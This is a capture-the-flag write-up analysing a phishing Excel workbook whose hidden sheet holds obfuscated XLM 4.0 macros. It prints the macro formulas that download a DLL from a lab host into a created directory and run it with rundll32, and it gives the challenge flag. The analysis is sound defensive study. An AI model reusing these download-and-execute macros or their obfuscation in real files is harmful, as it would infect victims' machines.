> Another Phishing document. Dig in and see if you can find what it executes.

> Author: **[0xdf][author-profile]**

## Random explorations

### Meta informations

We're given an Excel file: `trid`, `file`, `exiftool` don't see anything sketchy.

![][virustotal-details]

Windows Defender, Ad-Aware and a few others flag the file as a "trojan":

![][virustotal-detection]

### Unpacking

`binwalk` reminds us that the spreadsheet are actually an archive:

```shell
binwalk -e sources/oBfsC4t10n2.xls
# DECIMAL       HEXADECIMAL     DESCRIPTION
# --------------------------------------------------------------------------------
# 13419         0x346B          PNG image, 1008 x 733, 8-bit/color RGB, non-interlaced
# 13494         0x34B6          Zlib compressed data, compressed
# 302614        0x49E16         Zip archive data, at least v2.0 to extract, compressed size: 255, uncompressed size: 540, name: [Content_Types].xml
# 302918        0x49F46         Zip archive data, at least v2.0 to extract, compressed size: 192, uncompressed size: 310, name: _rels/.rels
# 303151        0x4A02F         Zip archive data, at least v2.0 to extract, compressed size: 131, uncompressed size: 138, name: theme/theme/themeManager.xml
# 303340        0x4A0EC         Zip archive data, at least v2.0 to extract, compressed size: 1743, uncompressed size: 8112, name: theme/theme/theme1.xml
# 305135        0x4A7EF         Zip archive data, at least v2.0 to extract, compressed size: 182, uncompressed size: 283, name: theme/theme/_rels/themeManager.xml.rels
# 305735        0x4AA47         End of Zip archive, footer length: 22
```

The content can be extracted with 7z:

```shell
7z e -opayloads/ sources/oBfsC4t10n2.xls & ls payloads/
# 2761257 816 -rw-r--r-- 1 gully gully 833805 Sep 10  2021  Workbook
# 2761264   4 -rw-r--r-- 1 gully gully   4096 Sep 10  2021 '[5]DocumentSummaryInformation'
# 2759208   4 -rw-r--r-- 1 gully gully   4096 Sep 10  2021 '[5]SummaryInformation'
```

There's a lot of base64, URLs and commands mixed in the Workbook:

```shell
strings Workbook | tail -n 64
# http://0b.htb/s.dll
# ShellExecuteA
# http://0b
# rstegerg3B
# hTXx.dl
# 4.0_M4cr0s_r_b4cK}
# URLDownloadToFileA
# Xc3l_
# c1zB0vasNO
# agawf23f
# Shell32
# tp://0
# ShellExe
# Lsl23Us7a
# URLDownl
# oadToFileA
# LDown
# 4.0_M
# kYKlI\U
# Shell
# URLDownloadToFileA
# 6.1D!
# A$0!(rR
# cuteA
# rncwner\
# iQhTXx.dll
# C:\rncwner\Ck
# adToFi
# htb/s.
# 7.0D
# Kernel32
# CreateDirectoryA
# C:\rncwner
# Kernel32
# CreateDirectoryA
# C:\rncwner\CkkYKlI
# 0s_r_
# JJCCJJ
# JJCCCCJ
# Open
# rundll32.exeD3
# URLMON
# C:\rncwner\CkuiQhTXx.dll
# KsshpqC4Mo
# MbP?_
# ffffff
# ffffff
# 333333
# ?333333
# Sheet1g
``` 

### Parsing the content

Oleid tells us there are macros in the document:

```rst
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 97-2003    |info      |                          
                    |Workbook or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Excel     |info      |Application name declared 
                    |                    |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Author              |0xdf                |info      |Author declared in        
                    |                    |          |properties                
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM    
                    |                    |          |macros. Use olevba to     
                    |                    |          |analyse them.             
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

And Olevba goes further and reveals a lot of formulas:

```bash
' Sheet,Reference,Formula,Value
' c1zB0vasN,D8,"IF(GET.WORKSPACE(42),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))",""
' c1zB0vasN,D9,GET.WORKSPACE(13),""
' c1zB0vasN,D10,GOTO(C1300),""
' c1zB0vasN,H60,"CONCATENATE(D187,P602,Y1087,L575)",""
' c1zB0vasN,I180,"CONCATENATE(E615,W1026)",""
' c1zB0vasN,D187,"CONCATENATE(K1036,D1095,Q603,B482)",""
' c1zB0vasN,Q222,"IF(GET.WORKSPACE(19),ON.TIME(NOW()+"00:00:02","rstegerg3"),CLOSE(TRUE))",""
' c1zB0vasN,O347,"CONCATENATE(I1324,M11,L54,F80,Y144,X179,P383)",""
' c1zB0vasN,K390,"CONCATENATE(R890,G625,D1023,O870)",""
' c1zB0vasN,U410,"CONCATENATE(B781,I781)",""
' c1zB0vasN,Y420,"CONCATENATE(B1193,F1204,W1216)",""
' c1zB0vasN,D450,"CONCATENATE(T7,V202)",""
' c1zB0vasN,D513,"CONCATENATE(Y841,L955,A1038,R1149,G1239)",""
' c1zB0vasN,N545,"WORKBOOK.HIDE("c1zB0vasNO",TRUE)",""
' c1zB0vasN,N546,GET.WORKSPACE(1),""
' c1zB0vasN,N547,"IF(ISNUMBER(SEARCH("Windows",N546)),ON.TIME(NOW()+"00:00:02","agawf23f"),CLOSE(FALSE))",""
' c1zB0vasN,L554,"CONCATENATE(D999,K1225)",""
' c1zB0vasN,L575,"CONCATENATE(F1242,W428,R608)",""
' c1zB0vasN,Q603,"CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)",""
' c1zB0vasN,E615,"CONCATENATE(D999,L1217,M1256,U1315)",""
' c1zB0vasN,T698,"IF(OR(D9<700),ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","Lsl23Us7a"))",""
' c1zB0vasN,O752,"CONCATENATE(D8,D513)",""
' c1zB0vasN,B781,"CONCATENATE(E1006,T1063,D874,P180)",""
' c1zB0vasN,I781,"CONCATENATE(Y222,K1085,P765,I809,C877)",""
' c1zB0vasN,D874,"CONCATENATE(E1164,U1191,V1285,N11,E94)",""
' c1zB0vasN,R890,"CONCATENATE(J1273,U385,T673,R75,H865)",""
' c1zB0vasN,C953,"CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)",""
' c1zB0vasN,D999,"CONCATENATE(X1224,P1281,U1293,G11,Q801)",""
' c1zB0vasN,R999,"",4.00000000000000000000
' c1zB0vasN,Q1000,CONCATENATE(U410),""
' c1zB0vasN,D1023,"IF(ISNUMBER(SEARCH("6.1",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))",""
' c1zB0vasN,D1024,GOTO(R1186),""
' c1zB0vasN,W1026,"CONCATENATE(B1334,B36,H461,G1019,U1036)",""
' c1zB0vasN,S1032,"CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)",""
' c1zB0vasN,S1035,"",4.00000000000000000000
' c1zB0vasN,C1040,"CONCATENATE(F1213,I1285,O347,X742)",""
' c1zB0vasN,P1047,"CONCATENATE(H730,C801,K802,S1032,C297,B358)",""
' c1zB0vasN,K1085,"CONCATENATE(G335,Q471,W570,F615,O686,V719)",""
' c1zB0vasN,Y1087,"CONCATENATE(T645,M750,N1097,V551,Z960,B994)",""
' c1zB0vasN,R1186,GET.WORKSPACE(1),""
' c1zB0vasN,R1187,"IF(NOT(ISNUMBER(SEARCH("7.0",R1186))),CLOSE(FALSE))",""
' c1zB0vasN,R1188,"CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner",0)",""
' c1zB0vasN,R1189,"CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner\CkkYKlI",0)",""
' c1zB0vasN,J1190,"CONCATENATE(T1000,W1063,O1107,K1131,D517)",""
' c1zB0vasN,R1190,"CALL(F1220,Q1000,"JJCCJJ",0,H60,G1332,0,0)",""
' c1zB0vasN,R1191,"CALL(L554,I180,"JJCCCCJ",0,"Open","rundll32.exe",CONCATENATE(G1332,D8,D513,K390),0,0)",""
' c1zB0vasN,R1192,GOTO(A1338),""
' c1zB0vasN,F1220,"CONCATENATE(K1184,Y420,D450)",""
' c1zB0vasN,K1225,"CONCATENATE(Q880,V1048)",""
' c1zB0vasN,C1300,GOTO(Q222),""
' c1zB0vasN,G1332,"CONCATENATE(P1047,C593,C1040)",""
' c1zB0vasN,D1337,"IF(F100<300,ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","KsshpqC4Mo"))",""
' c1zB0vasN,A1338,"FORMULA.FILL("a",R~0C~0)",""
' c1zB0vasN,A1339,HALT(),""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FORMULA.FILL        |May modify Excel 4 Macro formulas at runtime |
|          |                    |(XLM/XLF)                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |rundll32.exe        |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+
```

## Revealing the payload

At first, none of this appears in LibreOffice: the sheet "c1zB0vasN" is nowhere to be found.

It is hidden, the action "move / copy sheet" does show the sheet "c1zB0vasN" in the list: it can be copied in a visible sheet.

The resulting sheet is blank because of its formatting:

![][blank-hidden-sheet]

So the content can be revealed after altering the cell format:

![][revealed-content]

Still the formulas are fragmented over hundreds of cells, it is unreadable.

## Dynamic analysis?

Seeing how involved the fragmentation is, it'd be better to let the malware run and parse itself...

I saw it operate on VirusTotal and it was soooo tempting.
But I have no Windows box / VM ready with Excel, so I went on with the analysis in LibreOffice.

There are very few formulas, the sheet "c1zB0vasNo" is filled with an alphabet,
which is in turn used to form words / commands:

```
=CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777)
```

This one outputs " HTB{n0w_e". Getting closer OR being trolled!?..

To improve readability and browse all the formulas:

- Toggle "Formulas" in the display options: `Tools > Options > LibreOffice Calc > View > Display` 
- navigate using the named ranged, in the top left corner

After displaying the formulas instead of the values, a simple copy-paste to a
text file will produce a csv like output:

```
^   R   )   $   <   )   +   w   w   |   W   R   0   {   q   {   :   /   ^   =   %   e   "   ^   N   ;
t   v   2   >   4   N   7   y   $   %   9   !   w   K   *   K   S   F   =   1   T   m   x   r   B   F
"   |   R   K   b                                                                                   
+   R   -   d   Q   I   p   T   A   H   :   [   8   .   ?   '   \   !   f   n   F   t   t   5   .   _
a   +   B   R   {   e   T   -   8   ,   C   c   Z   q   Y   0   2   h   M   I   \   K   #   A   v   w
#   4   L   S   \   V   k   L   a   L   M   M   z   m   4   F   }   F   \   g   p   P   |   f   *   i
\   )   -   ]   ]   y   P   u   s   7   W   J   c   l   ?   h   Y   \   <   O   Q   \   p   !   M   /
T   z   `   =IF(#NAME!(),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777)) I   4   O   E   @   e   i   )   v   }   @   %   Q   _   ?   l   y   n   &   "   /   M
[   0   {   =#NAME!()   v   ,   1   \   e   ^   P   R   J   v   k   R   F   .   [   &   F   F   k   ~   p   {
x   M   d   =#NAME!()   <   1   \   ,   4   #   y   m   ~   R   v   n   Y   w   a   _   <   F   -   d   #   p
```

Which in turn allows to search for the concatenation formulas directly:

```shell
perl -ne 'm#(CONCATENATE\([A-Z0-9,]+\))#g && print $1."\n"' sources/oBfsC4t10n2.c1zB0vasNo.csv 
# CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777)
# CONCATENATE(D187,P602,Y1087,L575)
# CONCATENATE(E615,W1026)
# CONCATENATE(K1036,D1095,Q603,B482)
# CONCATENATE(I1324,M11,L54,F80,Y144,X179,P383)
# CONCATENATE(R890,G625,D1023,O870)
# CONCATENATE(B781,I781)
# CONCATENATE(B1193,F1204,W1216)
# CONCATENATE(T7,V202)
# CONCATENATE(Y841,L955,A1038,R1149,G1239)
# CONCATENATE(D999,K1225)
# CONCATENATE(F1242,W428,R608)
# CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)
# CONCATENATE(D999,L1217,M1256,U1315)
# CONCATENATE(D8,D513)
# CONCATENATE(E1006,T1063,D874,P180)
# CONCATENATE(E1164,U1191,V1285,N11,E94)
# CONCATENATE(J1273,U385,T673,R75,H865)
# CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)
# CONCATENATE(X1224,P1281,U1293,G11,Q801)
# CONCATENATE(U410)
# CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813)
# CONCATENATE(B1334,B36,H461,G1019,U1036)
# CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)
# CONCATENATE(F1213,I1285,O347,X742)
# CONCATENATE(H730,C801,K802,S1032,C297,B358)
# CONCATENATE(G335,Q471,W570,F615,O686,V719)
# CONCATENATE(T645,M750,N1097,V551,Z960,B994)
# CONCATENATE(T1000,W1063,O1107,K1131,D517)
# CONCATENATE(K1184,Y420,D450)
# CONCATENATE(Q880,V1048)
# CONCATENATE(P1047,C593,C1040)
```

And they can be evaluated in LibreOffice:

```
 HTB{n0w_e
http://0b.htb/s.dll
ShellExecuteA
http://0b
hTXx.dl
4.0_M4A$0!(rR}
URLDownloadToFileA
RLM
ON
Xc3l_
Shell32
dll
tp://0
ShellExe
#N/A
URLDownl
LDown
4.0_M
kYKlI\U
Shell
URLDownloadToFileA
cr0s_r_b4cK
cuteA
rncwner\
iQhTXx.dll
C:\rncwner\Ck
adToFi
htb/s.
0s_r_
URLMON
32
C:\rncwner\CkuiQhTXx.dll
```

> `HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}`

This is real! I really didn't expect to solve this one statically!

Now that it's done, I noticed that these strings were actually directly present in the Workbook:
the `strings` command from the first section had them all!

It seems that Office stored the results of the cells' formulas in the document itself (as-well as the formulas).

[author-profile]: https://app.hackthebox.eu/users/4935
[blank-hidden-sheet]: images/blank-hidden-sheet.png
[revealed-content]: images/revealed-content.png
[virustotal-details]: images/details.png
[virustotal-detection]: images/detection.png
